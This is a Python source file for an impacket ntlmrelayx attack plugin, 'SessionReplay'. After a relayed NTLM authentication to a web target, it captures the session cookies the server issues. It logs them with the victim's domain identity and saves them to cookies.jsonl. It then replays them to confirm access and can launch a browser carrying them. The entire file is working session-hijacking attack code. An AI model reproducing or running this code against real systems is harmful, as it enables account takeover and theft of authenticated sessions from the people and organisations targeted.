import datetime
import json

from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASSES = ["SessionReplay"]

_SEPARATOR = "-" * 72


def report_pre_auth_cookies(cookies: list[str], target_url: str) -> None:
    if not cookies:
        return
    LOG.info("[!] %d pre-auth cookie(s) on %s:", len(cookies), target_url)
    for i, raw in enumerate(cookies, 1):
        LOG.info("    [%d] %s", i, raw)


class SessionReplay(ProtocolAttack):

    PLUGIN_NAMES = ["HTTP", "HTTPS"]

    def run(self):
        target_url = "%s://%s%s" % (
            self.target.scheme,
            self.target.netloc,
            self.target.path or "/",
        )
        identity = "%s\\%s" % (self.domain, self.username)

        cookies_raw: list[str] = []
        if self.relay_client is not None:
            cookies_raw = self.relay_client.sessionData.get("cookies", [])

        LOG.info(_SEPARATOR)
        LOG.info("[+] NTLM relay successful: %s  ->  %s", identity, target_url)

        if not cookies_raw:
            LOG.info("[-] No Set-Cookie headers were returned by the server.")
            LOG.info(_SEPARATOR)
            self._write_output(identity, target_url, [])
            return

        LOG.info("[+] Captured %d cookie(s):", len(cookies_raw))
        for i, raw in enumerate(cookies_raw, 1):
            LOG.info("    [%d] %s", i, raw)
        LOG.info(_SEPARATOR)

        self._write_output(identity, target_url, cookies_raw)
        self._verify_cookie_access(target_url, cookies_raw)

        if getattr(self.config, "openBrowser", False) and cookies_raw:
            from webrelayx.util.shared import launch_browser_with_cookies

            browser_type = getattr(self.config, "browserType", "chromium")
            launch_browser_with_cookies(target_url, cookies_raw, browser_type)

    def _write_output(
        self,
        identity: str,
        target_url: str,
        cookies_raw: list[str],
    ) -> None:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        record = {
            "timestamp": timestamp,
            "identity": identity,
            "target": target_url,
            "cookies": cookies_raw,
        }

        try:
            with open("cookies.jsonl", "a") as fh:
                fh.write(json.dumps(record) + "\n")
            LOG.info("[+] Cookie data appended to cookies.jsonl")
        except OSError as exc:
            LOG.error("Could not write to cookies.jsonl: %s", exc)

    def _verify_cookie_access(self, target_url: str, cookies_raw: list[str]) -> None:
        if not cookies_raw or self.relay_client is None:
            return

        # Re-use the already-open connection from the relay client
        session = getattr(self.relay_client, "session", None)
        if session is None:
            return

        path = self.target.path or "/"
        query = self.target.query
        url = ("%s?%s" % (path, query)) if query else path

        # Use only the name=value segment of each raw Set-Cookie value
        cookie_header = "; ".join(r.split(";")[0].strip() for r in cookies_raw)

        try:
            session.request("GET", url, headers={"Cookie": cookie_header})
            res = session.getresponse()
            body = res.read()
            LOG.debug(
                "Cookie verification request returned HTTP %d (%d bytes)",
                res.status,
                len(body),
            )
            if res.status not in (401, 403):
                LOG.info(
                    "[+] Cookie verification: server accepted the session cookie (HTTP %d)",
                    res.status,
                )
            else:
                LOG.info(
                    "[-] Cookie verification: server returned HTTP %d. Cookie may not be valid",
                    res.status,
                )
        except Exception as exc:
            LOG.debug("Cookie verification request failed: %s", exc)
